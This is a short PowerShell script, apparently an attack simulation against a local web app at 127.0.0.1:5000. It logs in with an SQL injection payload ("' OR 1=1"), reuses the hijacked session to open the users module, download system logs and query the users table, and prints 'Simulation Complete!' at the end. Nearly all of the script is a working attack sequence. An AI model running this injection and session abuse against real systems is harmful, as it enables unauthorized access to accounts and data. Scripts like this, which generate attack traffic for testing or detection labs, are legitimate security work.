$session = $null

Write-Host "Triggering SQL Injection Login..."
Invoke-RestMethod -Uri "http://127.0.0.1:5000/login" -Method Post -Body @{username="' OR 1=1"; password="123"} -SessionVariable session
Start-Sleep -Seconds 3

Write-Host "Attacker clicks 'Users Module'..."
Invoke-RestMethod -Uri "http://127.0.0.1:5000/admin" -Method Post -Body @{action="open_users_module"} -WebSession $session
Start-Sleep -Seconds 3

Write-Host "Attacker clicks 'System Logs'..."
Invoke-RestMethod -Uri "http://127.0.0.1:5000/admin" -Method Post -Body @{action="download_system_logs"} -WebSession $session
Start-Sleep -Seconds 3

Write-Host "Attacker queries Database..."
Invoke-RestMethod -Uri "http://127.0.0.1:5000/admin/database" -Method Post -Body @{query="SELECT * FROM users LIMIT 10;"} -WebSession $session
Start-Sleep -Seconds 2
Write-Host "Simulation Complete!"
